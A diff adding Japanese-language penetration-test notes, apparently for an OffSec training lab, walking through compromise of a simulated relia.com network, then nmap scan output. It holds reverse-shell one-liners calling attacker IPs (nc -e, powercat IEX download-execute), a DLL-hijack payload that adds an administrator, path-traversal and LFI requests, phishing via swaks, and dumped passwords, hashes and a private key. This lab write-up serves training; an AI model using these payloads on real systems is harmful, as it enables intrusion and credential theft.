@@ -28,11 +28,18 @@ hacktricksに載ってるreverse shellの実行方法を使用しreverse shell�
 https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/dotnetnuke-dnn
 
 ```
-iwr -uri http://192.168.45.233:8000/nc64.exe -outfile nc.exe
-iwr -uri http://192.168.45.233:8000/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
-iwr -uri http://192.168.45.233:8000/agent.exe -outfile agent.exe
-iwr -uri http://192.168.45.233:8000/winPEASx64.exe -outfile winPEASx64.exe
-iwr -uri http://192.168.45.233:8000/mimikatz.exe -outfile mimikatz.exe
+cd C:\
+mkdir Tools
+cd Tools
+iwr -uri http://192.168.45.x4:8000/nc64.exe -outfile nc.exe
+iwr -uri http://192.168.45.x4:8000/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
+iwr -uri http://192.168.45.x4:8000/agent.exe -outfile agent.exe
+iwr -uri http://192.168.45.x4:8000/winPEASx64.exe -outfile winPEASx64.exe
+iwr -uri http://192.168.45.x4:8000/winPEASx86.exe -outfile winPEASx86.exe
+iwr -uri http://192.168.45.x4:8000/mimikatz.exe -outfile mimikatz.exe
+iwr -uri http://192.168.45.x4:8000/Rubeus.exe -outfile Rubeus.exe
+iwr -uri http://192.168.45.x4:8000/SharpHound.ps1 -outfile SharpHound.ps1
+./agent.exe -connect 192.168.45.x:11601 -ignore-cert
 ```
 
 godpotatoでsystem shell獲得
@@ -79,7 +86,7 @@ markのクレデンシャル情報でログインし、umbraco v 7.12.4である
 searchsploit umbraco
 ```
 
-49488.pyを利用して192.168.45.233 4449で頑張ってrevshell作成(powershellから直接は無理だった)
+49488.pyを利用して192.168.45.233 4449でrevshell作成(powershellから直接は無理だった)
 ```
 python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080' -c "powershell" -a "mkdir ../../../../Tools"
 
@@ -149,7 +156,1052 @@ type C:\xampp\passwords.txt
    
    Please do not forget to refresh the WEBDAV authentification (users and passwords). 
 ```
+
+.245でパストラバーサルの脆弱性があるため、/etc/passwdでユーザを覗く
+```
+curl http://192.168.104.245:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+```
+
+5キャラいることが判明
+```
+offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
+miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
+steven:x:1002:1002:Steven:/home/steven:/bin/sh
+mark:x:1003:1003:Mark:/home/mark:/bin/sh
+anita:x:1004:1004:Anita:/home/anita:/bin/sh
+```
+
+anitaのプライベートキーを摂取
+```
+curl http://192.168.104.245:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/id_ecdsa
+```
+
+パスフレーズクラック
+```
+ssh2john id_ecdsa > ssh.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+```
+
+ssh接続
+```
+ssh -s 2222 anita@192.104.245 -i ./id_ecdsa
+```
+
+local.txt
+```
+cat /home/anita/local.txt
+```
+
+linpeasCVE-2021-3165がサジェストされるので、以下のエクスプロイトを使用して権限昇格
+https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit/tree/main
+
+proof.txtを取得
+```
+cat /root/proof.txt
+```
+
+.246にanitaで同じ秘密鍵を利用してssh接続
+```
+ssh -s 2222 anita@192.104.246 -i ./id_ecdsa
+```
+
+8000ポートがlocalで開いてるので、ポートフォワードで持ってくる
+```
+ssh -p 2222 -L 4444:localhost:8000 anita@192.168.104.246 -i ./id_ecdsa
+```
+
+LFIの脆弱性があるのでphpのリバースシェルを/dev/shmに設置する
+```
+curl http://localhost:4444/backend/?view=../../../../../../../dev/shm/revshell.php
+```
+
+local.txtを取得
+```
+cat /home/anita/local.txt
+```
+
+proof.txtを取得
+```
+cat /root/proof.txt
+```
+
+.249はポート8000でhttpサーバが起動してるので、ディレクトリスキャンを実施する
+```
+http://192.168.146.249:8000/cms/
+```
+
+cmsというディレクトリを発見できるので、ファイルスキャンを実施
+```
+http://192.168.104.249:8000/cms/admin.php
+```
+
+上記にアクセスしてadmin:adminでログイン
+
+以下のmethod:1を実行してリバースシェルを獲得
+https://www.exploit-db.com/exploits/50616
+
+godpotatoからだとpowershellのシェルが安定しないので、winPEASでenumerationすると取得できるPSReadLineの情報からリモートでログインする
+```
+type C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+ipconfig
+hostname
+echo "Let's check if this script works running as damon and password i6yuT6tym@"
+echo "Don't forget to clear history once done to remove the password!"
+Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
+```
+
+damonのクレデンシャル情報
+```
+damon:i6yuT6tym@
+```
+
+mimikatzでは何も情報なし
+
+enumerationを回すとgitコマンドがインストールされていることが分かる
+```
+*Evil-WinRM* PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+displayname
+-----------
+
+Git
+
+XAMPP
+VMware Tools
+Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913
+Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913
+
+```
+
+stagingフォルダでgitによりコミット履歴を調べる
+```
+git history
+```
+
+showでコミット番号の中身を調べる
+```
+git show <コミット番号>
+```
+
+最初のコミット番号にクレデンシャル情報が含まれていることが分かる
+```
+commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
+Author: damian <damian>
+Date:   Thu Oct 20 02:07:42 2022 -0700
+
+    Email config not required anymore
+
+diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
+deleted file mode 100644
+index 77e370c..0000000
+--- a/htdocs/cms/data/email.conf.bak
++++ /dev/null
+@@ -1,5 +0,0 @@
+-Email configuration of the CMS
+-maildmz@relia.com:DPuBT9tGCBrTbR
+-
+-If something breaks contact jim@relia.com as he is responsible for the mail server.
+-Please don't send any office or executable attachments as they get filtered out for security reasons.
+\ No newline at end of file
+```
+
+クレデンシャル情報
+```
+maildmz@relia.com:DPuBT9tGCBrTbR
+```
+
+ユーザ
+```
+damian
+jim@relia.com
+adrian
+damon
+maildmz
+```
+
+189のSMTPサーバを使ってswaksでフィッシングメールを送る
+```
+sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.x.x --body @body.txt --header "Subject: Staging Script" --suppress-data -au maildmz@relia.com -ap DPuBT9tGCBrTbR
+```
+
+.14からリバースシェルが取れる
+winpeasで以下のファイルを確認
+```
+type C:\Users\jim\Pictures\exec.ps1
+```
+
+local.txt, proof.txtを取得
+```
+type C:\Users\jim\Desktop\local.txt
+type C:\Users\offsec\Desktop\proof.txt
+```
+
+中からjimのパスワード
+```
+Castello1!
+```
+
+kbdxファイルを発見するのでクラック
+```
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
+```
+
+マスターパスワードをとれる
+```
+mercedes1
+```
+
+kpcliで開く
+```
+kpcli --kdb=./Database.kdbx
+```
+```
+show -f 0
+```
+
+dmzadminのパスワードを手に入れる
+```
+dmzadmin:SlimGodhoodMope
+```
+
+.191 にrdpでログイン
+```
+xfreerdp3 /u:dmzadmin /p:SlimGodhoodMope /v:192.168.159.191 
+```
+
+Desktopにproof.txtを取得
+
+ligolo-ngをセット
+```
+./agent -connect 192.168.45.194:11601 -ignore-cert
+```
+
+.14の中から直接DCへのアクセスが許可されていないので、プロキシ経由でASREP-ROASTINGを試みる
+```
+sudo impacket-GetNPUsers -dc-ip  172.16.119.6 -request -outputfile hashes.asreproast relia.com/jim
+```
+
+michellaのasrepハッシュが取れる
+```
+michelle:NotMyPassword0k?
+```
+
+smb nxcすると、以下はどこでも資格情報があってそうなので、入れるかを確認
+```
+maildmz:DPuBT9tGCBrTbR
+jim:Castello1!
+michelle:NotMyPassword0k?
+```
+
+.7にmichelleのクレデンシャルでRDP可能なことを確認
+Desktopにlocal.txt
+```
+type C:\Users\michelle\Desktop\local.txt
+```
+
+ドメインのユーザ情報
+```
+andra
+annna
+brad
+dan
+iis_service
+internaladmin
+jenny
+jim
+krbtgt
+larry
+maildmz
+michelle
+milana
+mountuser
+```
+
+.7のPEはC:\Schedulerにscheduler.exeがいるのでdll hijackingできそう
+icaclsで見るとC:\Schedulerには読み取り実行権限しかない
+scheduler.exeをダウンロードしてきてwinprepでdll hijacking可能か確かめる
+`beyondhelper.dll`をdllでカレントディレクトリから読み込んでることを確認
+
+`beyondhelper.dll`でペイロードを作成する。以下を利用してkaliユーザ作成しAdministratorsとRemote Desktop Usersのグループに追加
+```
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user kali password123! /add");
+  	    i = system ("net localgroup administrators kali /add");
+  	    i = system ("net localgroup \"Remote Desktop Users\" kali /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+```
+x86_64-w64-mingw32-gcc adduser.cpp --shared -o beyondhelper.dll
+```
+
+RDPで接続しなおし、powershell -> run as adminでHigh Mandatory levelのシェルを獲得
+GodPotatoを利用してSYSYTEMシェルを取得
+```
+./GodPotato-NET4.exe -cmd "C:\Tools\nc.exe -e cmd.exe 192.168.45.194 5555"
+```
+
+proof.txtを取得
+```
+type C:\Users\Administrator\Desktop\proof.txt
+```
+
+mimikatzでandreaのクレデンシャル情報を取得
+```
+andrea:PasswordPassword_6
+```
+
+nxcでスキャン(14,7は除く)
+pwnedなし
+```
+sudo nxc smb ip.txt -u andrea -p "PasswordPassword_6" --continue-on-success 
+```
+
+rdpスキャン
+```
+sudo nxc rdp ip.txt -u andrea -p "PasswordPassword_6" --continue-on-success
+```
+
+.15が入れる
+```
+xfreerdp3 /u:andrea /p:"PasswordPassword_6" /v:172.16.119.15 
+```
+
+local.txtを取得
+```
+type C:\Users\andrea\Desktop\local.txt
+```
+
+schtaskを見ると、schedule.ps1が実行されてるのが見つかる
+```
+PS C:\updatecollector> schtasks /query /fo LIST /v | findstr /C:"Task To Run:" | findstr /V /I "system32 COM handler"
+Task To Run:                          %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe /reporting
+Task To Run:                          %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe
+Task To Run:                          powershell.exe -ep bypass -File C:\schedule.ps1
+Task To Run:                          powershell.exe -ep bypass -File C:\schedule.ps1
+Task To Run:                          BthUdTask.exe $(Arg0)
+Task To Run:                          sc.exe config upnphost start= auto
+Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpCmdRun.exe -IdleTask -TaskName WdCacheMaintenance
+Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpCmdRun.exe -IdleTask -TaskName WdCleanup
+Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpCmdRun.exe Scan -ScheduleJob -ScanTrigger 55 -IdleScheduledJob
+Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpCmdRun.exe -IdleTask -TaskName WdVerification
+```
+
+icaclsでAuthenticated Usersは編集可能なので、schedule.ps1にリバースシェルを書き込み
+```
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.x.x/powercat.ps1");powercat -c 192.168.x.x -p 4444 -e powershell 
+```
+
+権限が高いmilanaのシェルを取得
+mimikatzで以下のクレデンシャル情報を取得
+```
+milana:2237ff5905ec2fd9ebbdfa3a14d1b2b6
+offsec:cf998001c44803b490a46f363a2ca812
+```
+
+proof.txtを取得
+```
+type C:\Users\milana\Desktop\proof.txt 
+```
+
+keepassデータベースを発見
+```
+C:\Users\milana\Documents\Database.kdbx
+```
+
+passwordクラックすると以下
+```
+destiny1
+```
+
+以下のクレデンシャル情報を手に入れる
+```
+Title: BACKUP Machine SSH Key
+Uname: sarah
+ Pass: placeholder
+  URL: 
+Notes: -----BEGIN OPENSSH PRIVATE KEY-----
+       b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+       QyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAwAAAJgtoEZgLaBG
+       YAAAAAtzc2gtZWQyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAw
+       AAAECk3NMSFKJMauIwp/DPYEhMV4980aMdDOlfIlTq3qy4SkSFGA7D4B3Cvr5H8Dng2Dvl
+       YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
+       -----END OPENSSH PRIVATE KEY-----
+```
+
+上記のプライベートキーで19に入れることを確認
+```
+ssh -p 22 sarah@172.16.119.19 -i ./sarah_id_rsa
+```
+
+local.txtを取得
+```
+cat local.txt
+```
+
+linpeasを実行
+sudo borgが実行できることを確認
+
+下記がバックアップフォルダのよう
+```
+/opt/backupborg
+```
+
+pspyを使ってborgのパスフレーズを獲得
+```
+./pspy64
+```
+
+borgでパスフレーズを使用して標準出力させる
+```
+sudo borg extract --stdout /opt/borgbackup/::home 
+```
+
+最後の行で以下を確認
+```
+mesg n 2> /dev/null || true
+sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
+{
+    "user": "amy",
+    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
+}
+32022-10-17T22:29:47.295286/opt/borgbackup00000000200000a1
+```
+
+amyのパスワードとandrewのパスワードを確認
+```
+andrew:Rb9kNokjDsjYyH
+amy:0814b6b7f0de51ecf54ca5b6e6e612bf
+```
+
+amyのパスワードがMD5なのでcrackstationにかける
+```
+amy:backups1
+```
+
+amyへユーザ変更
+```
+su amy
+```
+
+sudo権限を持っているので権限昇格
+```
+sudo su
+```
+
+proof.txtを取得
+```
+cat /root/proof.txt
+```
+
+.20へandrewの情報を使ってsshでログイン
+```
+ssh -p 22 andrew@172.16.119.20
+```
+
+linpeas実行するとdoasのコンフィグが見える
+```
+permit nopass mandrew as root cmd service args apache24 onestart
+```
+
+コマンドを実行
+```
+doas -u root service apache24 onestart
+```
+
+apacheが起動する。書き込み権限のあるtmpにリバースシェルを置く
+```
+/usr/local/www/apache24/data/phpMyAdmin/tmp
+```
+
+ブラウザからアクセスしてwwwユーザでシェルを獲得
+
+local.txt proof.txtを取得
+```
+cat /usr/home/andrew/local.txt
+cat /root/proof.txt
+```
 # Port Scan
+# Intranet
+## 6 (DC02)
+### portscan
+```
+Open 172.16.119.6:53
+Open 172.16.119.6:88
+Open 172.16.119.6:135
+Open 172.16.119.6:139
+Open 172.16.119.6:389
+Open 172.16.119.6:445
+Open 172.16.119.6:464
+Open 172.16.119.6:593
+Open 172.16.119.6:636
+Open 172.16.119.6:9389
+```
+
+### port details
+```
+PORT     STATE SERVICE       REASON         VERSION
+53/tcp   open  domain        syn-ack ttl 64 Simple DNS Plus
+88/tcp   open  kerberos-sec  syn-ack ttl 64 Microsoft Windows Kerberos (server time: 2025-08-28 05:58:34Z)
+135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: relia.com0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds? syn-ack ttl 64
+464/tcp  open  kpasswd5?     syn-ack ttl 64
+593/tcp  open  ncacn_http    syn-ack ttl 64 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped    syn-ack ttl 64
+9389/tcp open  mc-nmf        syn-ack ttl 64 .NET Message Framing
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 54873/tcp): CLEAN (Timeout)
+|   Check 2 (port 16241/tcp): CLEAN (Timeout)
+|   Check 3 (port 49947/udp): CLEAN (Timeout)
+|   Check 4 (port 2141/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| nbstat: NetBIOS name: DC02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:07:b6 (VMware)
+| Names:
+|   DC02<00>             Flags: <unique><active>
+|   DC02<20>             Flags: <unique><active>
+|   RELIA<00>            Flags: <group><active>
+|   RELIA<1c>            Flags: <group><active>
+|   RELIA<1b>            Flags: <unique><active>
+| Statistics:
+|   00:50:56:ab:07:b6:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-08-28T05:58:53
+|_  start_date: N/A
+|_clock-skew: 0s
+
+```
+## 7 (INTRANET)
+### portscan
+```
+Open 172.16.119.7:80
+Open 172.16.119.7:135
+Open 172.16.119.7:139
+Open 172.16.119.7:443
+Open 172.16.119.7:445
+Open 172.16.119.7:3306
+Open 172.16.119.7:3389
+Open 172.16.119.7:5985
+```
+
+### port details
+```
+80/tcp   open  http          syn-ack ttl 64 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
+|_http-generator: WordPress 6.0.3
+|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
+|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
+| http-title: RELIA INTRANET &#8211; Just another WordPress site
+|_Requested resource was http://172.16.119.7/wordpress/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
+443/tcp  open  ssl/http      syn-ack ttl 64 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
+|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| tls-alpn: 
+|_  http/1.1
+|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
+| http-title: RELIA INTRANET &#8211; Just another WordPress site
+|_Requested resource was https://172.16.119.7/wordpress/
+|_ssl-date: TLS randomness does not represent time
+|_http-generator: WordPress 6.0.3
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
+| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
+| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
+| -----BEGIN CERTIFICATE-----
+| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
+| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
+| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
+| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
+| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
+| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
+| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
+| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
+| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
+|_-----END CERTIFICATE-----
+445/tcp  open  microsoft-ds? syn-ack ttl 64
+3306/tcp open  mysql         syn-ack ttl 64 MariaDB 10.3.23 or earlier (unauthorized)
+3389/tcp open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
+|_ssl-date: 2025-08-28T06:02:20+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=INTRANET.relia.com
+| Issuer: commonName=INTRANET.relia.com
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-08-27T05:30:27
+| Not valid after:  2026-02-26T05:30:27
+| MD5:   2bf2:e0fd:3b58:ba90:d238:70e9:90ff:7359
+| SHA-1: e5c0:4aba:eb9b:04ef:72c8:c1dd:80bf:6b5c:ba5c:9aef
+| -----BEGIN CERTIFICATE-----
+| MIIC6DCCAdCgAwIBAgIQMS5k7JMTr49Eujio6/ilNjANBgkqhkiG9w0BAQsFADAd
+| MRswGQYDVQQDExJJTlRSQU5FVC5yZWxpYS5jb20wHhcNMjUwODI3MDUzMDI3WhcN
+| MjYwMjI2MDUzMDI3WjAdMRswGQYDVQQDExJJTlRSQU5FVC5yZWxpYS5jb20wggEi
+| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDgkk7ePAxPKZKUQDaPPUFiAy6u
+| JFTcXBCYSS10+wTzVvELiP26jM//kFqIE1v0P0Jq6/bvj6UtRfqZAAdfxM+pNtCZ
+| +kv/8qKtOv8XLLZ77LUOlhM50r5tu9fIA/1Aqk24vl8kwr9+EXFsr+puKJUsFgsL
+| g8B8Nm1MW/JlxvvdvDGtZk/Zzk4bgLKrNVGmW31TPuxhN2MSQ/vHRgaVstvoad7V
+| I7S6QtMnL5tjHVHLnOpzBgc3jJuspGVG4/AejWSQu1e6yqQHvjMRfGFIdK9Coi/6
+| zXiwnKWcU3zqPmDQphPA6ffkmkPAx677gGYXQL70bPxroemgAY+JUXlKRXN1AgMB
+| AAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG
+| 9w0BAQsFAAOCAQEAy94MdVAOaRqPBV/P4aHaxpbKnDag/yEW50gmcUE9r22o85Bn
+| HLnfymrPHkLj/V8CN0jI3rIDtvzkgdjTFMTVpR1e14sjps3C3dq1zs8eCN0MtbB3
+| +3XxqzsBZtD4SRyawslJX2tPulQ57DFc15MMGu3rwp2q6iLEQt798VQHvw2ifiZ9
+| uCb3+DKvNferpPZtTfT/tv5kkUVTFDIVwHUeoRkX5hzYyTPjGoHx7wLO5qPunZOA
+| idNUDKTCYwcUe9aMJ4hjt/f00HQPJALA0qbvq4tlgttRkTQusH4JO+cyqVtru0lj
+| 0A6tQkh14qoFJdRIDlzLX4zvN3T7/hUKDp0PeQ==
+|_-----END CERTIFICATE-----
+| rdp-ntlm-info: 
+|   Target_Name: RELIA
+|   NetBIOS_Domain_Name: RELIA
+|   NetBIOS_Computer_Name: INTRANET
+|   DNS_Domain_Name: relia.com
+|   DNS_Computer_Name: INTRANET.relia.com
+|   DNS_Tree_Name: relia.com
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-08-28T06:01:42+00:00
+5985/tcp open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+TCP/IP fingerprint:
+SCAN(V=7.95%E=4%D=8/28%OT=80%CT=%CU=%PV=Y%G=N%TM=68AFF0EE%P=x86_64-pc-linux-gnu)
+SEQ(SP=104%GCD=1%ISR=10D%TI=I%CI=I%II=RI%TS=A)
+SEQ(SP=FD%GCD=1%ISR=10A%TI=RD%CI=I%II=RI%TS=8)
+OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
+WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
+ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
+T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
+T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
+T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=N)
+IE(R=Y%DFI=S%TG=40%CD=S)
+
+Uptime guess: 15.363 days (since Tue Aug 12 17:20:08 2025)
+TCP Sequence Prediction: Difficulty=253 (Good luck!)
+IP ID Sequence Generation: Randomized
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-08-28T06:01:41
+|_  start_date: N/A
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| nbstat: NetBIOS name: INTRANET, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:7a:6b (VMware)
+| Names:
+|   INTRANET<20>         Flags: <unique><active>
+|   INTRANET<00>         Flags: <unique><active>
+|   RELIA<00>            Flags: <group><active>
+| Statistics:
+|   00:50:56:ab:7a:6b:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 24924/tcp): CLEAN (Timeout)
+|   Check 2 (port 53990/tcp): CLEAN (Timeout)
+|   Check 3 (port 42418/udp): CLEAN (Timeout)
+|   Check 4 (port 48151/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+```
+
+### feroxbuster
+```
+
+```
+## 14 (WK01)
+
+## 15 (WK02)
+### portscan
+```
+Open 172.16.119.15:139
+Open 172.16.119.15:135
+Open 172.16.119.15:445
+Open 172.16.119.15:3389
+```
+### port details
+```
+PORT     STATE SERVICE       REASON         VERSION
+135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds? syn-ack ttl 64
+3389/tcp open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
+|_ssl-date: 2025-08-28T06:03:58+00:00; -1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: RELIA
+|   NetBIOS_Domain_Name: RELIA
+|   NetBIOS_Computer_Name: WK02
+|   DNS_Domain_Name: relia.com
+|   DNS_Computer_Name: WK02.relia.com
+|   DNS_Tree_Name: relia.com
+|   Product_Version: 10.0.22000
+|_  System_Time: 2025-08-28T06:03:19+00:00
+| ssl-cert: Subject: commonName=WK02.relia.com
+| Issuer: commonName=WK02.relia.com
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-08-27T05:30:38
+| Not valid after:  2026-02-26T05:30:38
+| MD5:   196b:ddcb:48a1:8cd9:76fb:34f8:d86d:5ffb
+| SHA-1: 9710:bc4d:2431:779a:cb3a:1a6c:cd3e:9108:34a0:ce68
+| -----BEGIN CERTIFICATE-----
+| MIIC4DCCAcigAwIBAgIQGvgPn4jk/bZD9oruAkBPKzANBgkqhkiG9w0BAQsFADAZ
+| MRcwFQYDVQQDEw5XSzAyLnJlbGlhLmNvbTAeFw0yNTA4MjcwNTMwMzhaFw0yNjAy
+| MjYwNTMwMzhaMBkxFzAVBgNVBAMTDldLMDIucmVsaWEuY29tMIIBIjANBgkqhkiG
+| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAluDjuAj1IWA7VJKrkzfbdTpqJGHXKIjrBoAA
+| 5fPn2ZvEodOn+9L8M/VdYJjCvqYLTvD/EnXqbU5uJFmumtQb04r2VcwTmwnVxYjy
+| Us0p/yzUKdVa5j0s5kb69i9+RRX6qn2xvjxXzVchtLmfvQxaxG+A5vowVlYsU1Pu
+| Z8loPkdKt3/8IN6AqkHM7kkFHzlsnPuV3g+B0l4db/eMvU45lO54zIY8BXnLShNE
+| ZdGHAuzWUEdL7lJWEUdvR+PEFJRhfa6eorFRxW3H8xwtu4EJOs2dB1MNDvy7EQkr
+| nCNm9VU6MsYmAbfjpBN8W36rq5g1rCtcMb8DQ56YMdVbZsbZEQIDAQABoyQwIjAT
+| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
+| ggEBAB+RFDqxBRHjIuKI9AysxSRFZX+H44TDXbbw2zzg8Cg7XLZOeykr7+gNn4ZZ
